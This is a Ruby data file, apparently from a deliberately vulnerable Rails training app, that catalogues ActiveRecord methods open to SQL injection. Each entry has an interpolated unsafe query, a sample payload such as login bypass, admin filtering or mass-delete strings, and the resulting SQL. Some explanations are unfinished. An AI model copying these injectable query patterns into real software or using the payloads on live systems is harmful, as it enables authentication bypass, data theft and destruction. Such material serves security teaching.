Queries = [
  {
    :action => :calculate,
    :name => "Calculate Methods (Count)",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Calculations.html#method-i-calculate",
    :query => "User.calculate(:count, payload[:column])",
    :input => {:name => :column, :example => "first_name) from users where is_admin=true;--"},
    :sql => "SELECT COUNT(users.'REPLACE') FROM users",
    :explanation => "The COUNT method is used in this example query, but all of the calculate methods accept the name of the column as the second parameter.  That value is not escaped so if a request parameter is used here, the method will be vulnerable."
  },

  {
    :action => :delete_by,
    :name => "Delete By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-delete_by",
    :query => 'OrderProduct.delete_by("id = #{payload[:id]}")',
    :input => {:name => :id, :example => '1) OR 1=1--'},
    :sql => "DELETE FROM order_products WHERE (id = 'REPLACE')",
    :explanation => "This method effectively accepts a WHERE clause. Hash parameters will be encoded, so this method is only vulnerable if user-controlled data is directly incorporated (via interpolation) into the clause."
  },

  {
    :action => :destroy_by,
    :name => "Destroy By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-destroy_by",
    :query => 'User.destroy_by(["id = ? AND is_admin = #{payload[:is_admin]}", params[:id]])',
    :input => {:name => :is_admin, :example => "false) OR 1=1 --"},
    :sql => "SELECT users.* FROM users WHERE (id = NULL AND is_admin = 'REPLACE')",
    :explanation => "This method effectively accepts a WHERE clause. Hashes will be encoded, so this method is only vulnerable if user-controlled data is directly incorporated (via interpolation) into the clause."
  },

  {
    :action => :exists,
    :name => "Exists? Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/FinderMethods.html#method-i-exists-3F",
    :query => 'User.exists?(["last_name LIKE \'#{payload[:user]}%%\'"])',
    :input => {:name => :user, :example => "' OR is_admin=true and first_name LIKE 'A" },
    :sql => "SELECT 1 AS one FROM users WHERE (last_name LIKE ''REPLACE'%') LIMIT $1  [[\"LIMIT\", 1]]",
    :explanation => "Only vulnerable if an array is passed, but request parameters can sometimes be changed to arrays. Since the method will only ever return true or false, blind injection is the likely exploit path."
  },

  {
    :action => :find_by,
    :name => "Find By Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/FinderMethods.html#method-i-find_by",
    :query => 'User.find_by("first_name = \'#{payload[:first_name]}\' AND pw_hash = \'#{params[:not_used_in_demo]}\'")',
    :input => {:name => :first_name, :example => "') OR 1=$1 --"},
    :sql => "SELECT users.* FROM users WHERE (first_name = ''REPLACE'' AND pw_hash = '')",
    :explanation => "This method accepts a WHERE clause and will encode parameters if passed as a hash.  It is vulnerable if the user data is directly incorporated into the string. This example simulates a login query. Successfully, returning a user object would result in logging in as that user."
  },

  {
    :action => :from_method,
    :name => "From Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-from",
    :query => 'User.from(payload[:from]).where("is_admin IS NULL")',
    :input => {:name => :from, :example => "users where is_admin=true and 0!=$1; --"},
    :sql => "SELECT users.* FROM 'REPLACE' WHERE (is_admin IS NULL) LIMIT $1",
    :explanation => "The from method expects a table name, but does not encode the value. An application may populate a request paramter with a known good value and use it in this method forgetting that an attacker can modify all parameters sent to the server. This example is very contrived and the only valid (non-injection) input is users."
  },

  {
    :action => :group_method,
    :name => "Group Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-group",
    :query => "OrderProduct.select(:order_id).group(payload[:group])",
    :input => {:name => :group, :example => "id from order_products where 99=$1;--"},
    :sql => "SELECT order_products.quantity FROM order_products GROUP BY 'REPLACE' LIMIT $1",
    :explanation => "METHOD INCOMPLETE The group method accepts the field name to group by. nd commenting the rest of the automatic query will be easiest. Valid non-injection input for this field is order_id and product_id."
  },

  {
    :action => :having,
    :name => "Having Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-having",
    :query => 'Order.where(:user_id => 1).group(:user_id).having("total > #{payload[:total]}")',
    :input => {:name => :total, :example => "1) UNION SELECT * FROM orders--"},
    :sql => 'REPLACE',
    :explanation => "METHOD INCOMPLETE - The having method is like a WHERE clause but it was designed to act on aggregator functions. A query with a HAVING clause must also have a GROUP BY clause. ????. Since grouping by a column that was not selected would result in an SQL error, rails automatically puts the value in both the SELECT and GROUP BY clauses.  Often this means injecting into the SELECT portion and commenting the rest of the automatic query will be easiest. Valid non-injection input for this field is order_id and product_id."
  },


  {
    :action => :joins,
    :name => "Joins Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-joins",
    :query => 'User.joins(payload[:table]).where("credit_card IS NULL").all',
    :input => {:name => :table, :example => "--"},
    :sql => "SELECT users.* FROM users 'REPLACE' WHERE (credit_card IS NULL) /* loading for inspect */ LIMIT $1 ",
    :explanation => "The parameter will be inserted after the FROM clause and before the WHERE clause, but ActiveRecord will not add any text to it, allowing the developer to perform a JOIN, INNER JOIN, or OUTER JOIN. The condition (generally one id column equaling another, must also be specified.  An example valid input would be: JOIN Orders on user_id=users.id."
  },

  {
    :action => :lock,
    :name => "Lock Method and Option",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-lock",
    :query => "User.where('id > 1').lock(payload[:lock])",
    :input => {:name => :lock, :example => "?"},
    :sql => "SELECT users.* FROM users WHERE (id > 1) LIMIT $1 'REPLACE'",
    :explanation => "The value is database dependent.  Unlikely to be a user controlled variable, but may be a hidden parameter designed to control behavior of different queries executed from the same form. Postgres values include FOR UPDATE, FOR SHARE, and FOR NO KEY UPDATE.  The value specified is directly appended to the end of the query, but after the LIMIT clause so it is too late for a UNION.  Can add OFFSET to select a different record than intended by the application e.g. OFFSET 1"
  },

  {
    :action => :not,
    :name => "Not Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods/WhereChain.html#method-i-not",
    :query => 'User.where.not("is_admin = true OR id IN (#{payload[:excluded]})").all',
    :input => {:name => :excluded, :example => "1)) OR 1=1 --"},
    :sql => "SELECT users.* FROM users WHERE NOT (is_admin = true OR id IN ('REPLACE')) LIMIT $1",
    :explanation => "The not method inverts a WHERE clause. Injection into this method works the same way where it will be vulnerable only if the user controlled data is incorporated into the string directly."
  },

  {
    :action => :select_method,
    :name => 'Select Method',
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-select",
    :query => 'User.select(payload[:column])',
    :input => {:name => :column, :example => "* FROM USERS WHERE 0!=$1; --"},
    :sql => "SELECT 'REPLACE' FROM users",
    :explanation => "The select method expects to receive valid column names, but does not escape the text received. If the application passes a column name as a request parameter, an attacker can use the field for injection. Note that some behind the scenes code (likely in the results generation) prevents retrieving data from a different table than the original."
  },

  {
    :action => :reselect_method,
    :name => 'Reselect Method',
    :link => 'https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-reselect',
    :query => 'User.select(:name).reselect(payload[:column])',
    :input => {:name => :column, :example => "* FROM orders WHERE 0!=$1;-- "},
    :sql => "SELECT 'REPLACE' FROM users LIMIT $1",
    :explanation => "This method behaves identically to select and simply overrides any previous select methods. It also expects to receive valid column names, but does not escape the text received. If the application passes a column name as a request parameter, an attacker can use the field for injection. Since the `SELECT` clause is at the beginning of the query, nearly any SQL can be injected and the remainder of the intended query simply commented out."
  },

  {
    :action => :where,
    :name => "Where Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-where",
    :query => 'User.where("first_name = \'#{payload[:first_name]}\' AND pw_hash = \'SUBMITTED_PASSWORD\'")',
    :input => {:name => :first_name, :example => "') OR 1--"},
    :sql => "SELECT users.* FROM users WHERE (first_name = 'REPLACE' AND pw_hash = 'SUBMITTED_PASSWORD') LIMIT $1",
    :explanation => "Where is probably the most common method used and could easily incorporate user data unsafely through string concatenation or interpolation. If data is passed correctly as a hash, Rails will safely encoded it. The example here is a classic login construction. If you can return a user object, you would have been logged in as that user."
  },

  {
    :action => :rewhere,
    :name => "Rewhere Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/QueryMethods.html#method-i-rewhere",
    :query => 'User.where(first_name: "Bob").rewhere("email LIKE \'#{payload[:search]}%\'")',
    :input => {:name => :search, :example => "a') OR 0!=$2--'"},
    :sql => "SELECT users.* FROM users WHERE users.first_name = $1 AND (email LIKE ''REPLACE'%') LIMIT $2",
    :explanation => "Rewhere behaves identically to where and is used in code to override a previous clause. It could also easily incorporate user data unsafely through string concatenation or interpolation. If data is passed correctly as a hash, Rails will safely encoded it. The example here is another login construction. If you can return a user object, you would have been logged in as that user."
  },

  {
    :action => :update_all_method,
    :name => "Update All Method",
    :link => "https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/Relation.html#method-i-update_all",
    :query => 'User.update_all("is_admin = true WHERE id IN (#{payload[:id_list]})")',
    :input => {:name => :id_list, :example => '\' OR 1=1;'},
    :sql => "UPDATE users SET is_admin = true WHERE id IN ('REPLACE')",
    :explanation => "The update all method effectively takes a where clause. If assembled using hashes it will be safe, if it is assembed using concatenation or interpolation it will be vulnerable.  NOTE: In testing this method did not actually modify the database, so other than getting past an SQL error, this method will not be much fun to work with."
  },
]
